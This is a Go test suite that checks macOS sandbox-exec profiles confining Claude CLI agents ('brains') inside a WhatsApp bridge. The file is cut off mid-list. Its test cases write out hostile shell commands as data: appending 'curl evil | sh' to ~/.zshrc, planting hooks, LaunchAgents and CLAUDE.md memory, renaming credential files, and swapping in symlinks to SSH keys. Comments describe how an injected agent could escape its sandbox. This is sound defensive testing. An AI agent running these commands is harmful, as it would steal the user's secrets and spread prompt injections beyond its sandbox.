//go:build darwin

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// These tests run generated profiles under the real sandbox-exec, so they
// check what the sandbox enforces rather than what the profile text says.

func requireSandboxExec(t *testing.T) {
	t.Helper()
	if _, err := os.Stat(sandboxExecPath); err != nil {
		t.Skipf("%s not available: %v", sandboxExecPath, err)
	}
	// Inside another sandbox (go test run from a sandboxed tool) sandbox-exec
	// cannot apply any profile and fails with "Operation not permitted", the
	// same words as a denied access: a test that only expects denials would
	// pass without testing anything.
	if out, err := exec.Command(sandboxExecPath, "-p", "(version 1)(allow default)", "/usr/bin/true").CombinedOutput(); err != nil {
		t.Skipf("%s cannot apply a profile here: %v: %s", sandboxExecPath, err, out)
	}
}

// TestSandboxedRunAppliesProfileInline runs a brain through invoke with the
// sandbox on: the CLI starts under sandbox-exec, cannot read another brain's
// folder, and still starts when TMPDIR is unwritable (which used to break
// the profile file and, before that, the sandbox itself).
func TestSandboxedRunAppliesProfileInline(t *testing.T) {
	requireSandboxExec(t)
	mgr, d, home := queueTestManager(t, 0, `, "sandbox": {"enabled": true}`)
	secret := filepath.Join(home, "b", "secret.txt")
	if err := os.WriteFile(secret, []byte("brain b only"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("FRIDOLIN_FAKE_READ", secret)

	tmp := t.TempDir()
	if err := os.Chmod(tmp, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(tmp, 0o700) })
	t.Setenv("TMPDIR", tmp)

	if _, _, _, err := mgr.Submit(dm("hello")); err != nil {
		t.Fatal(err)
	}
	waitFor(t, 20*time.Second, "the run", func() bool { return d.count() == 1 })
	res := d.all()[0].res
	if res.Err != nil {
		t.Fatalf("sandboxed run failed: %v", res.Err)
	}
	if !strings.Contains(res.Text, "read=denied") {
		t.Errorf("brain a's run = %q, want it denied brain b's file", res.Text)
	}
}

// TestSandboxedRunTurnsOffTheAutoUpdater: the profile denies writes to the
// Claude CLI's install, so its auto-updater could download a new version on
// every sandboxed run and never switch to it. Sandboxed runs therefore get
// DISABLE_AUTOUPDATER=1, whatever the bridge's own value; runs without the
// sandbox get the bridge's own, which childEnvAllowlist passes on.
func TestSandboxedRunTurnsOffTheAutoUpdater(t *testing.T) {
	cases := []struct {
		name, extra string
		bridge      string // the bridge's own value, "" for unset
		want        string
	}{
		{"sandboxed", `, "sandbox": {"enabled": true}`, "", "DISABLE_AUTOUPDATER=1"},
		{"sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": true}`, "0", "DISABLE_AUTOUPDATER=1"},
		{"not sandboxed", `, "sandbox": {"enabled": false}`, "", "DISABLE_AUTOUPDATER unset"},
		{"not sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": false}`, "0", "DISABLE_AUTOUPDATER=0"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if strings.Contains(c.extra, `"enabled": true`) {
				requireSandboxExec(t)
			}
			t.Setenv("DISABLE_AUTOUPDATER", c.bridge)
			if c.bridge == "" {
				os.Unsetenv("DISABLE_AUTOUPDATER")
			}
			t.Setenv("FRIDOLIN_FAKE_ENV", "DISABLE_AUTOUPDATER")
			mgr, d, _ := queueTestManager(t, 0, c.extra)
			if _, _, _, err := mgr.Submit(dm("hello")); err != nil {
				t.Fatal(err)
			}
			waitFor(t, 20*time.Second, "the run", func() bool { return d.count() == 1 })
			res := d.all()[0].res
			if res.Err != nil {
				t.Fatalf("run failed: %v", res.Err)
			}
			if !strings.HasSuffix(res.Text, " "+c.want) {
				t.Errorf("run = %q, want it to end with %q", res.Text, c.want)
			}
		})
	}
}

// TestSandboxedSiteSearchGetsTheBrainsOwnState: a site module's search runs
// a Claude agent in the brain's folder under the brain's sandbox, which
// lets the brain write nowhere but its own places, so the search must get
// the brain's own Claude Code config dir and TMPDIR as its runs do, or the
// CLI could keep neither its state nor its temporary files.
func TestSandboxedSiteSearchGetsTheBrainsOwnState(t *testing.T) {
	requireSandboxExec(t)
	tb := newTestBridge(t, `, "sandbox": {"enabled": true}`)
	tb.addFolderBrain(t, BrainManifest{ID: "a", Name: "A", Routing: BrainRouting{HandlesDMs: true}})
	state := filepath.Join(tb.home, "data", "brains", "a")
	for name, want := range map[string]string{"CLAUDE_CONFIG_DIR": state + "/claude", "TMPDIR": state + "/tmp"} {
		t.Run(name, func(t *testing.T) {
			t.Setenv("FRIDOLIN_FAKE_ENV", name)
			var out bytes.Buffer
			if err := tb.runBrainSearch(context.Background(), "a", "where is the letter?", &out); err != nil {
				t.Fatalf("search: %v\n%s", err, out.String())
			}
			if !strings.Contains(out.String(), name+"="+want+`"`) {
				t.Errorf("search output %s, want %s=%s", out.String(), name, want)
			}
		})
	}
}

// TestSandboxIgnoresPlantedSymlinks: a brain may write its own folder and
// its media inbox, so it can swap either (or an allow_paths folder inside a
// writable denied dir) for a symlink to a secret.
// Allow rules must not follow such a symlink on the next run.
//
// It covers runs of the brain set as it was resolved. Resolving the brains
// again (a config reload or a restart) runs canonicalDir on every folder,
// which follows a symlink planted in place of a brain's own folder. The
// profile cannot tell that from a configured folder, so only brain
// resolution can refuse it.
func TestSandboxIgnoresPlantedSymlinks(t *testing.T) {
	requireSandboxExec(t)
	homes := []struct {
		name string
		make func(t *testing.T) string
	}{
		{"canonical home", func(t *testing.T) string { return canonicalDir(t.TempDir()) }},
		{"home under /var", func(t *testing.T) string { return filepath.Join(t.TempDir(), "home") }},
	}
	plants := []struct {
		name, link, target, read string // relative to HOME
	}{
		{"own folder", "assistant/a", ".ssh", "assistant/a/id_ed25519"},
		{"own media inbox", ".fridolin/media/a", ".ssh", ".fridolin/media/a/id_ed25519"},
		{"allow_paths folder", "Documents/share", ".ssh", "Documents/share/id_ed25519"},
	}
	for _, h := range homes {
		for _, pl := range plants {
			t.Run(h.name+"/"+pl.name, func(t *testing.T) {
				home := h.make(t)
				t.Setenv("HOME", home)
				sp, _ := sandboxFixture(t, home, "b", "clients")
				link := filepath.Join(home, pl.link)
				if err := os.Rename(link, link+".moved"); err != nil {
					t.Fatal(err)
				}
				if err := os.Symlink(filepath.Join(home, pl.target), link); err != nil {
					t.Fatal(err)
				}
				// A run that sees the plant is refused, which keeps the
				// secret as well as a deny does: the bridge refuses an inbox
				// that is no folder when it prepares the brain's state, and
				// the profile a folder that became one it protects.
				if _, err := sandboxState(sp, "a"); err != nil {
					return
				}
				if _, _, err := sp.Command("a", "/bin/cat", nil); err != nil {
					return
				}
				if allowed, out := sandboxTry(t, sp, home, false, filepath.Join(home, pl.read)); allowed {
					t.Errorf("brain a read the secret through its planted symlink: %q", out)
				}
			})
		}
	}
}

// sandboxLayout is one way to lay out a fake home for the enforcement test.
type sandboxLayout struct {
	name string
	// home creates and returns the HOME to configure.
	home func(t *testing.T) string
	// otherBrain and denyDir name brain b's folder and the deny_paths entry.
	otherBrain, denyDir string
}

// sandboxLayouts are the fake homes the enforcement tests run in.
func sandboxLayouts() []sandboxLayout {
	return []sandboxLayout{
		{name: "canonical home", home: func(t *testing.T) string { return canonicalDir(t.TempDir()) },
			otherBrain: "b", denyDir: "clients"},
		// No-break spaces, emoji joiners, quotes and backslashes in folder
		// names. Go's %q quoting broke the first two silently.
		{name: "unusual characters", home: func(t *testing.T) string { return canonicalDir(t.TempDir()) },
			otherBrain: "My\u00a0Brain \"q\" \\ \U0001F468\u200d\U0001F469\u200d\U0001F467",
			denyDir:    "Screenshot 10.00\u202fAM"},
		// t.TempDir() is under /var, a symlink to /private/var, so HOME and
		// the data dir are reached through a symlink. Before the profile
		// resolved its paths, a brain read the data dir via /private/var.
		{name: "home under /var", home: func(t *testing.T) string { return filepath.Join(t.TempDir(), "home") },
			otherBrain: "b", denyDir: "clients"},
		{name: "symlinked home and folders", home: symlinkedHome, otherBrain: "b", denyDir: "clients"},
		// Regular-expression characters in HOME, for the rules that match a
		// pattern below a folder.
		{name: "pattern characters in home", home: func(t *testing.T) string {
			home := filepath.Join(canonicalDir(t.TempDir()), "h.o+m(e)[1]{2}$^|*")
			if err := os.Mkdir(home, 0o700); err != nil {
				t.Fatal(err)
			}
			return home
		}, otherBrain: "b", denyDir: "clients"},
	}
}

// sandboxCheck is one access a brain tries under its profile.
type sandboxCheck struct {
	name  string
	write bool   // write a new file at path instead of reading it
	path  string // relative to HOME
	allow bool
}

// TestSandboxEnforcesProfile builds the effective config, the brain set and
// the profile through the real code, then runs /bin/cat and /bin/sh under
// sandbox-exec as brain a. Every check runs through the configured spelling
// of the path and through the real one, because the sandbox matches real
// paths and an injected brain can use either.
func TestSandboxEnforcesProfile(t *testing.T) {
	requireSandboxExec(t)
	checks := []sandboxCheck{
		{"own folder read", false, "assistant/a/notes.md", true},
		{"own folder write", true, "assistant/a/new.md", true},
		{"other brain read", false, "assistant/{b}/diary.md", false},
		{"other brain write", true, "assistant/{b}/planted.md", false},
		{"data dir token", false, ".fridolin/dashboard.token", false},
		{"data dir database", false, ".fridolin/bridge.db", false},
		{"data dir write", true, ".fridolin/planted", false},
		{"own media inbox read", false, ".fridolin/media/a/photo.jpg", true},
		{"own media inbox write", true, ".fridolin/media/a/new.jpg", true},
		{"other brain's media inbox read", false, ".fridolin/media/b/dm.pdf", false},
		{"other brain's media inbox write", true, ".fridolin/media/b/planted.pdf", false},
		{"attachment not yet routed", false, ".fridolin/media/.incoming/voice.ogg", false},
		{"media folder write", true, ".fridolin/media/planted.jpg", false},
		// The bridge makes a brain's calendar calls with it.
		{"own calendar token", false, "creds/google_calendar_token_a.json", false},
		{"other brain's calendar token", false, "creds/google_calendar_token_b.json", false},
		{"credentials dir write", true, "creds/planted.json", false},
		{"ssh key", false, ".ssh/id_ed25519", false},
		{"login keychain", false, "Library/Keychains/login.keychain-db", false},
		{"keychain folder write", true, "Library/Keychains/planted.keychain-db", false},
		{"deny_paths entry", false, "{deny}/contract.txt", false},
		{"default-denied Documents", false, "Documents/private.txt", false},
		{"your Claude Code settings", false, ".claude/settings.json", false},
		{"your sessions' transcripts", false, ".claude/projects/p/s.jsonl", false},
		{"your ~/.claude.json", false, ".claude.json", false},
		{"its backup", false, ".claude.json.backup", false},
		{"the Plaud login", false, ".plaud/tokens.json", false},
		{"allow_paths entry", false, "Documents/share/ok.txt", true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{".claude/settings.json", ".claude/projects/p/s.jsonl", ".claude.json", ".claude.json.backup", ".plaud/tokens.json"} {
				writeTestFile(t, filepath.Join(home, f), "content of "+f)
			}
			expand := strings.NewReplacer("{b}", l.otherBrain, "{deny}", l.denyDir)
			for _, c := range checks {
				configured := filepath.Join(home, expand.Replace(c.path))
				spellings := [][2]string{{"configured", configured}}
				if real := resolvedForTest(t, configured); real != configured {
					spellings = append(spellings, [2]string{"real", real})
				}
				for _, spelling := range spellings {
					label, p := spelling[0], spelling[1]
					if c.write {
						p += "." + label // a fresh file per spelling
					}
					t.Run(c.name+"/"+label, func(t *testing.T) {
						allowed, out := sandboxTry(t, sp, ownDir, c.write, p)
						if allowed != c.allow {
							t.Errorf("%s: allowed=%v, want %v (output %q)", p, allowed, c.allow, out)
						}
					})
				}
			}
		})
	}
}

// TestSandboxRefusesRenames: the sandbox matches paths, not files, so a
// brain that renamed a denied path, or a folder above one, used to read it
// under its new name (mv ~/.git-credentials ~/gc && cat ~/gc). Every class
// of deny must refuse the rename, while the brain's own tree stays free.
func TestSandboxRefusesRenames(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name     string
		from, to string // relative to HOME
		allow    bool
	}{
		{"home-relative literal", ".git-credentials", "gc", false},
		{"home-relative subpath", ".ssh", "s2", false},
		{"file out of a subpath", ".ssh/id_ed25519", "id", false},
		{"other brain's folder", "assistant/{b}", "b2", false},
		{"other brain's parent", "assistant", "as2", false},
		{"data dir", ".fridolin", "f2", false},
		{"file out of the data dir", ".fridolin/dashboard.token", ".fridolin/media/a/token", false},
		{"file out of another brain's media inbox", ".fridolin/media/b/dm.pdf", "assistant/a/dm.pdf", false},
		{"its own media inbox", ".fridolin/media/a", ".fridolin/media/a2", false},
		{"its own media inbox into its own folder", ".fridolin/media/a", "assistant/a/inbox", false},
		{"credentials dir", "creds", "c2", false},
		{"other brain's calendar token", "creds/google_calendar_token_b.json", "t.json", false},
		{"deny_paths entry", "{deny}", "d2", false},
		{"folder above a default deny", "Library", "lib2", false},
		{"another session's transcript", ".claude/projects/other/s.jsonl", "s.jsonl", false},
		{"the transcripts folder", ".claude/projects", "p2", false},
		{"the folder above the transcripts", ".claude", "c3", false},
		{"own file", "assistant/a/notes.md", "assistant/a/renamed.md", true},
		{"own subfolder", "assistant/a/sub", "assistant/a/sub2", true},
		{"file in its own media inbox", ".fridolin/media/a/photo.jpg", ".fridolin/media/a/p2.jpg", true},
		{"file out of its own media inbox", ".fridolin/media/a/photo.jpg", "assistant/a/photo.jpg", true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{".git-credentials", "Library/Mail/inbox", ".claude/projects/other/s.jsonl", "assistant/a/sub/f"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			expand := strings.NewReplacer("{b}", l.otherBrain, "{deny}", l.denyDir)
			try := func(t *testing.T, from, to string, allow bool) {
				allowed, out := sandboxRun(t, sp, ownDir, "/bin/mv", from, to)
				if allowed != allow {
					t.Errorf("mv %s %s: allowed=%v, want %v (output %q)", from, to, allowed, allow, out)
				}
				if allowed {
					// Put it back for the cases that follow.
					if err := os.Rename(to, from); err != nil {
						t.Fatal(err)
					}
				}
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					try(t, filepath.Join(home, expand.Replace(c.from)), filepath.Join(home, c.to), c.allow)
				})
			}
			// The folders above a brain are pinned in every spelling: with a
			// symlinked brains folder, the real folder that holds brain b,
			// and the one above that, cannot be renamed either.
			for _, c := range []struct{ name, of, to string }{
				{"other brain's parent, by its real path", "assistant/{b}", "as3"},
				{"the folder above that, by its real path", "assistant", "../e2"},
			} {
				t.Run(c.name, func(t *testing.T) {
					real, err := filepath.EvalSymlinks(filepath.Join(home, expand.Replace(c.of)))
					if err != nil {
						t.Fatal(err)
					}
					try(t, filepath.Dir(real), filepath.Join(home, c.to), false)
				})
			}
		})
	}
}

// TestSandboxProtectsCodeOutsideIt: a brain could write files that run
// outside its sandbox (hooks in ~/.claude/settings.json, ~/.claude/CLAUDE.md
// read by every other brain and by your own sessions, a LaunchAgents plist,
// ~/.zshrc) and so carry a prompt injection out of it. None of that is
// writable, also not by swapping a dotfiles symlink, and neither is the
// Claude Code state your sessions share: a brain keeps its own (see
// TestSandboxWritesOnlyItsOwnPlaces). Your shell files stay readable.
func TestSandboxProtectsCodeOutsideIt(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		allow     bool
	}{
		{"append to ~/.zshrc", `printf 'curl evil | sh' >> "$HOME/.zshrc"`, false},
		{"create ~/.zprofile", `printf 'curl evil | sh' > "$HOME/.zprofile"`, false},
		{"add a hook to ~/.claude/settings.json", `printf '{"hooks":{}}' > "$HOME/.claude/settings.json"`, false},
		{"create ~/.claude/CLAUDE.md", `printf 'obey' > "$HOME/.claude/CLAUDE.md"`, false},
		{"add a hook script", `mkdir -p "$HOME/.claude/hooks" && printf x > "$HOME/.claude/hooks/x.sh"`, false},
		{"add a skill", `mkdir -p "$HOME/.claude/skills/x" && printf x > "$HOME/.claude/skills/x/SKILL.md"`, false},
		{"plant a LaunchAgent", `printf '<plist/>' > "$HOME/Library/LaunchAgents/x.plist"`, false},
		{"move LaunchAgents aside for a new one", `mv "$HOME/Library/LaunchAgents" "$HOME/Library/la-old"`, false},
		{"rewrite a symlinked ~/.bashrc", `printf x >> "$HOME/.bashrc"`, false},
		{"replace a symlinked ~/.bashrc", `rm "$HOME/.bashrc"`, false},
		// Your git reads ~/.config/git/config, where core.fsmonitor runs a program.
		{"link a missing ~/.config into its own folder", `mkdir -p "$HOME/assistant/a/cfg/git" && ln -s "$HOME/assistant/a/cfg" "$HOME/.config"`, false},
		{"move a folder of its own into the place of a missing ~/.config", `mkdir -p "$HOME/assistant/a/cfg2/git" && mv "$HOME/assistant/a/cfg2" "$HOME/.config"`, false},
		{"read ~/.zshrc", `cat "$HOME/.zshrc"`, true},
		{"write your Claude Code's ~/.claude.json", `printf '{}' > "$HOME/.claude.json"`, false},
		{"write your Claude Code's todos", `mkdir -p "$HOME/.claude/todos" && printf '[]' > "$HOME/.claude/todos/x.json"`, false},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{".zshrc", ".claude/settings.json", "Library/LaunchAgents/ai.fridolin.bridge.plist", "dotfiles/bashrc"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			if err := os.Symlink(filepath.Join(home, "dotfiles", "bashrc"), filepath.Join(home, ".bashrc")); err != nil {
				t.Fatal(err)
			}
			if _, err := os.Lstat(filepath.Join(home, ".config")); !os.IsNotExist(err) {
				t.Fatalf("~/.config exists before the run: %v", err)
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
			if data, err := os.ReadFile(filepath.Join(home, "dotfiles", "bashrc")); err != nil || string(data) != "content of dotfiles/bashrc" {
				t.Errorf("the dotfiles target changed: %q, %v", data, err)
			}
		})
	}
}

// TestSandboxProtectsMemoryAboveBrains: Claude Code loads CLAUDE.md and
// .claude/ from every folder above its working directory, and every new
// session of a project loads that project's auto-memory. A brain that wrote
// ~/assistant/CLAUDE.md reached the next run of every other brain there,
// and one that wrote ~/CLAUDE.md or a memory file reached your own sessions
// too. Under the real sandbox-exec none of that is writable, while the
// brain's own CLAUDE.md and .claude/ are.
func TestSandboxProtectsMemoryAboveBrains(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		allow     bool
	}{
		{"append to ~/CLAUDE.md", `printf obey >> "$HOME/CLAUDE.md"`, false},
		{"create ~/CLAUDE.local.md", `printf obey > "$HOME/CLAUDE.local.md"`, false},
		{"create ~/.mcp.json", `printf '{}' > "$HOME/.mcp.json"`, false},
		{"append to the brains folder's CLAUDE.md", `printf obey >> "$HOME/assistant/CLAUDE.md"`, false},
		{"create the brains folder's CLAUDE.local.md", `printf obey > "$HOME/assistant/CLAUDE.local.md"`, false},
		{"create the brains folder's .claude", `mkdir "$HOME/assistant/.claude"`, false},
		{"append to a project's auto-memory", `printf obey >> "$HOME/.claude/projects/p/memory/MEMORY.md"`, false},
		{"start a new project's auto-memory", `mkdir -p "$HOME/.claude/projects/new/memory"`, false},
		{"move a project's auto-memory aside", `mv "$HOME/.claude/projects/p/memory" "$HOME/.claude/projects/p/m2"`, false},
		{"write its own CLAUDE.md", `printf notes >> "$HOME/assistant/a/CLAUDE.md"`, true},
		{"write its own .claude", `mkdir -p "$HOME/assistant/a/.claude/rules" && printf x > "$HOME/assistant/a/.claude/rules/r.md"`, true},
		{"add to one of your sessions' transcripts", `printf '{}' >> "$HOME/.claude/projects/p/s.jsonl"`, false},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{"CLAUDE.md", "assistant/CLAUDE.md", ".claude/projects/p/memory/MEMORY.md", ".claude/projects/p/s.jsonl"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
		})
	}
}

// TestSandboxKeepsYourInstructionsFromBrains: under the real sandbox-exec,
// a brain can read none of the instructions Claude Code would load from
// above its folder (the CLAUDE.md files, the .claude/ folders with their
// rules and skills, ~/.claude/CLAUDE.md and ~/.claude/rules) nor the rest
// of ~/.claude, nor move them aside to read them there. Its own CLAUDE.md
// stays readable. With inherit_claude_user_config the instructions and
// your setup are readable again, but still not movable.
func TestSandboxKeepsYourInstructionsFromBrains(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd         string // cmd runs in sh with $HOME set
		isolated, inherit bool   // whether it is allowed
	}{
		{"read ~/CLAUDE.md", `cat "$HOME/CLAUDE.md"`, false, true},
		{"read ~/CLAUDE.local.md", `cat "$HOME/CLAUDE.local.md"`, false, true},
		{"read the brains folder's CLAUDE.md", `cat "$HOME/assistant/CLAUDE.md"`, false, true},
		{"read a rule above the brain", `cat "$HOME/assistant/.claude/rules/r.md"`, false, true},
		{"read a skill above the brain", `cat "$HOME/assistant/.claude/skills/s/SKILL.md"`, false, true},
		{"list the .claude above the brain", `ls "$HOME/assistant/.claude"`, false, true},
		{"read ~/.claude/CLAUDE.md", `cat "$HOME/.claude/CLAUDE.md"`, false, true},
		{"read a rule in ~/.claude", `cat "$HOME/.claude/rules/r.md"`, false, true},
		{"move the .claude above the brain aside", `mv "$HOME/assistant/.claude" "$HOME/assistant/c2"`, false, false},
		{"move ~/.claude/rules aside", `mv "$HOME/.claude/rules" "$HOME/.claude/r2"`, false, false},
		{"read your ~/.claude/settings.json", `cat "$HOME/.claude/settings.json"`, false, true},
		{"read its own CLAUDE.md", `cat "$HOME/assistant/a/CLAUDE.md"`, true, true},
	}
	for _, l := range sandboxLayouts() {
		for _, inherit := range []bool{false, true} {
			name := l.name
			if inherit {
				name += " with inherit_claude_user_config"
			}
			t.Run(name, func(t *testing.T) {
				home := l.home(t)
				t.Setenv("HOME", home)
				sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir, map[string]any{"inherit_claude_user_config": inherit})
				for _, f := range []string{"CLAUDE.md", "CLAUDE.local.md", "assistant/CLAUDE.md", "assistant/.claude/rules/r.md",
					"assistant/.claude/skills/s/SKILL.md", ".claude/CLAUDE.md", ".claude/rules/r.md", ".claude/settings.json", "assistant/a/CLAUDE.md"} {
					p := filepath.Join(home, f)
					if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
						t.Fatal(err)
					}
					if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
						t.Fatal(err)
					}
				}
				for _, c := range cases {
					t.Run(c.name, func(t *testing.T) {
						want := c.isolated
						if inherit {
							want = c.inherit
						}
						if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != want {
							t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, want, out)
						}
					})
				}
				// The CLI walks up from the folder's real path, which in the
				// symlinked layout passes a folder no configured path names.
				t.Run("read the CLAUDE.md two folders above its real path", func(t *testing.T) {
					real, err := filepath.EvalSymlinks(ownDir)
					if err != nil {
						t.Fatal(err)
					}
					p := filepath.Join(filepath.Dir(filepath.Dir(real)), "CLAUDE.md")
					if err := os.WriteFile(p, []byte("content of "+p), 0o600); err != nil {
						t.Fatal(err)
					}
					if allowed, out := sandboxTry(t, sp, ownDir, false, p); allowed != inherit {
						t.Errorf("reading %s: allowed=%v, want %v (output %q)", p, allowed, inherit, out)
					}
				})
			})
		}
	}
}

// TestSandboxWritesOnlyItsOwnPlaces: a brain could write anywhere outside a
// short denylist, which let it plant code that runs outside its sandbox:
// hooks or a CLAUDE.md in ~/.claude, which every other brain and your own
// sessions load, another session's transcript, a LaunchAgent, ~/.zshrc, a
// program in a PATH folder (/opt/homebrew is user-writable too) or the
// bridge's own install and checkout. Under the real sandbox-exec it now
// writes only its folder, its media inbox and its own state: its Claude
// Code config dir, TMPDIR and caches. It can still run the programs the
// bridge runs, and read the bridge's tools.
func TestSandboxWritesOnlyItsOwnPlaces(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	outside := canonicalDir(t.TempDir()) // not in HOME, like /opt/homebrew
	t.Setenv("OUT", outside)
	sp, own := sandboxFixture(t, home, "b", "clients")
	for _, f := range []string{
		".local/lib/fridolin/fridolin", ".local/lib/fridolin/install.json", ".local/lib/fridolin/tools/calendar_tool.py",
		".local/bin/claude", "fridolin/go.mod", "fridolin/tools/calendar_tool.py",
		".claude/settings.json", "projects/other/.claude/settings.json", ".zshrc",
	} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("#!/bin/sh\necho ran\n"), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	sp.bridgeExe = filepath.Join(home, ".local", "lib", "fridolin", "fridolin")
	state := filepath.Join(home, ".fridolin", "brains", "a")
	t.Setenv("S", state)
	t.Setenv("I", filepath.Join(home, ".fridolin", "media", "a"))
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME, $OUT, $S (a's state) and $I (a's inbox) set
		allow     bool
	}{
		{"write its own folder", `printf x > "$PWD/new.md"`, true},
		{"write its media inbox", `printf x > "$I/new.jpg"`, true},
		{"write its Claude Code config dir", `mkdir -p "$S/claude/projects/p" && printf '{}' > "$S/claude/projects/p/s.jsonl" && printf '{}' > "$S/claude/.claude.json"`, true},
		{"write its TMPDIR", `printf x > "$S/tmp/t"`, true},
		{"write its cache", `mkdir -p "$S/cache/huggingface" && printf x > "$S/cache/huggingface/m"`, true},
		{"discard output", `printf x > /dev/null`, true},
		{"run a program the bridge runs", `"$HOME/.local/bin/claude"`, true},
		{"read a bridge tool", `cat "$HOME/.local/lib/fridolin/tools/calendar_tool.py"`, true},
		{"replace its own state folder", `mv "$S/tmp" "$S/t2"`, false},
		// The bridge moves the files of a's chats into the inbox, and the
		// profile opens it by name.
		{"swap its media inbox for a link to another brain's", `mv "$I" "$PWD/inbox" && ln -s "$HOME/.fridolin/media/b" "$I"`, false},
		{"remove its media inbox for a link to another brain's", `rm -rf "$I" && ln -s "$HOME/.fridolin/media/b" "$I"`, false},
		{"another brain's state", `mkdir -p "$HOME/.fridolin/brains/b/tmp" && printf x > "$HOME/.fridolin/brains/b/tmp/t"`, false},
		{"add a hook to your Claude Code settings", `printf '{"hooks":{}}' > "$HOME/.claude/settings.json"`, false},
		{"write your user memory", `printf obey > "$HOME/.claude/CLAUDE.md"`, false},
		{"add to another session's transcript", `mkdir -p "$HOME/.claude/projects/x" && printf '{}' >> "$HOME/.claude/projects/x/s.jsonl"`, false},
		{"write another project's Claude Code settings", `printf '{"hooks":{}}' > "$HOME/projects/other/.claude/settings.json"`, false},
		{"plant a LaunchAgent", `mkdir -p "$HOME/Library/LaunchAgents" && printf '<plist/>' > "$HOME/Library/LaunchAgents/x.plist"`, false},
		{"append to ~/.zshrc", `printf 'curl evil | sh' >> "$HOME/.zshrc"`, false},
		{"install a tool of its own on PATH", `printf x > "$HOME/.local/bin/mytool"`, false},
		{"replace the Claude CLI", `printf x > "$HOME/.local/bin/claude"`, false},
		{"replace the bridge binary", `printf x > "$HOME/.local/lib/fridolin/fridolin"`, false},
		{"rewrite a bridge tool", `printf x >> "$HOME/.local/lib/fridolin/tools/calendar_tool.py"`, false},
		{"write in the bridge's checkout", `printf x > "$HOME/fridolin/tools/x_test.py"`, false},
		{"write outside your home folder", `printf x > "$OUT/planted"`, false},
		{"write a shared cache", `mkdir -p "$HOME/.cache/uv" && printf x > "$HOME/.cache/uv/x"`, false},
		{"write next to the brains", `printf x > "$HOME/assistant/planted"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if allowed, out := sandboxRun(t, sp, own, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}
}

// TestSandboxDeniesBridgeSecretsWhereverTheyLive: with db_path outside the
// data dir, the WhatsApp session store (enough to take the account over
// from another machine) used to be readable by every brain, and so was a
// data dir left behind under the old project name.
func TestSandboxDeniesBridgeSecretsWhereverTheyLive(t *testing.T) {
	requireSandboxExec(t)
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir, map[string]any{"db_path": "~/wa-store/bridge.db"})
			for _, f := range []string{
				"wa-store/bridge.db-wal",
				"wa-store/notes.txt",
				".whatsapp-claude-bridge/bridge.db",
				".whatsapp-claude-bridge/dashboard.token",
				"Library/Logs/fridolin/stderr.log",
